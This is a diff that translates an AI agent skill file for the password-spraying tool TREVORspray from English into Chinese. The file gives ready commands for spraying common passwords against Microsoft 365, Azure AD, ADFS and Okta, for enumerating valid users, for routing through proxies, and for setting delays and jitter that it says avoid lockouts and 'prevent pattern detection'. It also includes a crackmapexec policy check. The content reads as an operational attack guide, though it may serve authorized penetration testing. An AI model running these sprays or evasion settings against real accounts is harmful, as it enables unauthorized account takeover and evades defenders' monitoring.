@@ -1,51 +1,47 @@
 ---
 name: trevorspray
 description: >
-  This skill should be used when the user asks about "trevorspray", "perform
-  password spraying against Office 365, Azure", "AD environments", "enumerate
-  valid usernames", "test lockout-safe spraying with jitter and delay
-  controls". Threaded password spraying tool targeting Microsoft 365, Azure
-  AD, ADFS, and on-prem Active Directory.
+  此技能适用于用户询问关于 "trevorspray"、"对 Office 365、Azure 进行密码喷洒"、"AD 环境"、"枚举有效用户名"、"使用抖动和延迟控制进行防锁定喷洒测试"。针对 Microsoft 365、Azure AD、ADFS 及本地 Active Directory 的多线程密码喷洒工具。
 ---
 
 # TREVORspray
 
-Modular, threaded password spraying tool for Microsoft/Azure/AD targets.
+针对 Microsoft/Azure/AD 目标的模块化多线程密码喷洒工具。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Spray M365 with a single password
+# 使用单个密码对 M365 进行喷洒
 trevorspray -u users.txt -p "Summer2024!" --module msol
 
-# Spray on-prem AD via ADFS
+# 通过 ADFS 对本地 AD 进行喷洒
 trevorspray -u users.txt -p "Password123" --module adfs -t https://adfs.target.com
 
-# Enumerate valid users only (no password)
+# 仅枚举有效用户名（不进行密码尝试）
 trevorspray -u users.txt --module msol --enum
 ```
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
+| 参数 | 说明 |
 |------|-------------|
-| `-u <file>` | Username file (or single username) |
-| `-p <pass>` | Password to spray |
-| `-P <file>` | Password list (spray each, with delay) |
-| `--module <mod>` | Target module |
-| `-t <url>` | Target URL (for ADFS/OWA modules) |
-| `--threads <n>` | Threads (default 1) |
-| `--delay <s>` | Delay between requests (seconds) |
-| `--jitter <s>` | Random jitter added to delay |
-| `--lockout-delay <s>` | Wait after potential lockout |
-| `--enum` | Username enumeration only |
-| `-o <file>` | Output file |
-| `--reauth` | Re-authenticate after delay (for expired tokens) |
-| `--proxy <url>` | Proxy |
+| `-u <file>` | 用户名文件（或单个用户名） |
+| `-p <pass>` | 喷洒使用的密码 |
+| `-P <file>` | 密码列表（依次喷洒，含延迟） |
+| `--module <mod>` | 目标模块 |
+| `-t <url>` | 目标 URL（用于 ADFS/OWA 模块） |
+| `--threads <n>` | 线程数（默认 1） |
+| `--delay <s>` | 请求间延迟（秒） |
+| `--jitter <s>` | 延迟随机抖动值 |
+| `--lockout-delay <s>` | 疑似触发锁定后的等待时间 |
+| `--enum` | 仅进行用户名枚举 |
+| `-o <file>` | 输出文件 |
+| `--reauth` | 延迟后重新认证（用于 Token 过期场景） |
+| `--proxy <url>` | 代理 |
 
-## Modules
+## 模块说明
 
-| Module | Target |
+| 模块 | 目标 |
 |--------|--------|
 | `msol` | Microsoft Online / Office 365 |
 | `adfs` | Active Directory Federation Services |
@@ -53,32 +49,32 @@ trevorspray -u users.txt --module msol --enum
 | `lync` | Skype for Business |
 | `okta` | Okta SSO |
 
-## Common Workflows
+## 常用工作流
 
 ```bash
-# Safe M365 spray — 1 attempt per 30 min to avoid lockouts
+# 安全 M365 喷洒 —— 每 30 分钟一次，避免账号锁定
 trevorspray -u users.txt -p "Spring2024!" --module msol --delay 1800 --jitter 60
 
-# Enumerate valid M365 users (no lockout risk)
+# 枚举有效 M365 用户（无锁定风险）
 trevorspray -u users.txt --module msol --enum -o valid_users.txt
 
-# ADFS spray with proxy
+# 通过代理进行 ADFS 喷洒
 trevorspray -u users.txt -p "Password1" --module adfs -t https://sts.target.com \
   --delay 60 --jitter 30 --proxy http://127.0.0.1:8080
 
-# Multi-password spray with controlled delay
+# 多密码喷洒，使用受控延迟
 trevorspray -u valid_users.txt -P passwords.txt --module msol --delay 3600
 ```
 
-## Lockout Awareness
+## 锁定策略注意事项
 
-- Check password policy before spraying: `crackmapexec smb <dc> --pass-pol`
-- Use `--delay 3600` (1 hour) for environments with 1-attempt/hour lockout policies
-- Prefer `--enum` first to reduce invalid user noise
-- Jitter prevents pattern detection: `--delay 1800 --jitter 300`
+- 喷洒前先检查密码策略：`crackmapexec smb <dc> --pass-pol`
+- 对于每小时仅允许 1 次尝试的环境，使用 `--delay 3600`
+- 优先使用 `--enum` 先筛选有效用户，减少无效用户噪音
+- 使用抖动防止规律性检测：`--delay 1800 --jitter 300`
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/lockout-policy.md` | Lockout policy detection, safe timing calculations, user enumeration techniques |
+| `references/lockout-policy.md` | 锁定策略检测、安全时间计算、用户枚举技术 |
